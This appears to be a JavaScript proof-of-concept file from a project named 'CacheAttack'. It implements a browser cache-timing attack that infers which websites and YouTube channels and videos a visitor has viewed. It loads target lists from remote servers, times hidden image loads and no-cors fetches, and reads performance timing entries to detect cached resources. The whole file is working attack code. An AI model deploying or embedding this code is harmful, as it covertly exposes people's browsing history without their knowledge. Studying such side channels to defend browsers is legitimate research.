// NDev 2020 https://github.com/NDevTK/CacheAttack
const max = 10;

ifCached = (navigator.userAgent.includes("Firefox")) ? ifCached_1Wrap : ifCached_2;

async function getRules() {
    let req = await fetch("https://cache.ndev.tk/rules");
    let body = await req.json();
    return new Map(body);
}

function is304(res) {
    if (res.encodedBodySize > 0 &&
        res.transferSize > 0 &&
        res.transferSize < res.encodedBodySize) {
        return true;
    }
    return null;
}

function PerformanceCheck(url) {
    var res = performance.getEntriesByName(url).pop();
    if(res === undefined) return null
    if(is304(res)) return true;
    return (res.transferSize === 0);
}

async function getWebsites(callback, CacheTest = true) {
    var output = [];
    var callback = (callback) ? callback : website => {
    	output.push(website);
    };
    var Websites = await getRules();
    if(CacheTest) {
        let TestResult = await ifCached_test();
        if(!TestResult) throw "Cache is not working :-("
    }
    // Foreach website check if cached
    for (let website of Websites) {
        let result = await ifCached(website[0]);
		let check = PerformanceCheck(website[0]);
		if(check || result && check === null) {
			callback(website[1]);
		}
	}
    return output;
};

async function getVideos(callback) {
  checkedChannels = [];
  let r = await fetch("https://cache.ndev.tk/channels");
  let channels = await r.json();
  YTCrawler(channels, callback);
}

async function YTCrawler(channels, callback) {
  for (channel of channels) {
    if(checkedChannels.includes(channel[1])) continue
    checkedChannels.push(channel[1]);
    let result = await ifCached(channel[1].concat("=s88-c-k-c0xffffffff-no-rj-mo"));
    if(!result) continue // Channel not seen
    let r = await fetch("https://invidio.us/api/v1/channels/"+encodeURI(channel[0]));
    let channelData = await r.json();
    callback(channelData.author);
    channelData.latestVideos.forEach(async video => {
      let res = await fetch("https://cors.usercontent.ndev.tk/board/all/?v="+encodeURI(video.videoId));
      if(res.status !== 200) return
      let board = await res.json();
      for (url of board) {
        let result = await ifCached(url);
        let check = PerformanceCheck(url);
        if (check || result && check === null) {
          return callback(video.title + " ("+video.videoId+")");
        }
      };
      var relatedChannels = [];
      for (relatedChannel of channelData.relatedChannels) {
        let url = relatedChannel.authorThumbnails[0].url.split("=")[0];
        relatedChannels.push([relatedChannel.authorId, url]);
      }
      await YTCrawler(relatedChannels, callback);
    });
  }
}

async function ifCached_test() {
    let cache_test = "https://ndev.tk/README.md?".concat(Math.random());
    let result = await ifCached(cache_test);
    return (!result);
}

async function ifCached_1Wrap(url) {
    try {
        await ifCached_1(url);
    } catch(err) {
        return false
    }
    return true
}

function ifCached_1(url) {
    return new Promise((resolve, reject) => {
        var blocked = false;
        let img = new Image(0, 0);
        img.hidden = true;
        img.onerror = _ => {
            clearTimeout(timeout);
            resolve();
        };
        img.onload = _ => resolve();
        img.src = url;
        var timeout = setTimeout(_ => {
            img.src = "";
            img.remove();
            reject();
        }, max);
    });
}

async function ifCached_2(url){
    var state = true;
    var controller = new AbortController();
    var signal = controller.signal;
    var timeout = await setTimeout(_ => { // Stop request after max
        controller.abort();
        state = false;
    }, max);
    try {
        await fetch(url, {mode: "no-cors", signal});
    } catch(err) {
	    // Website blocked by client
	    clearTimeout(timeout);
	}
    clearTimeout(timeout);
    return state;
}
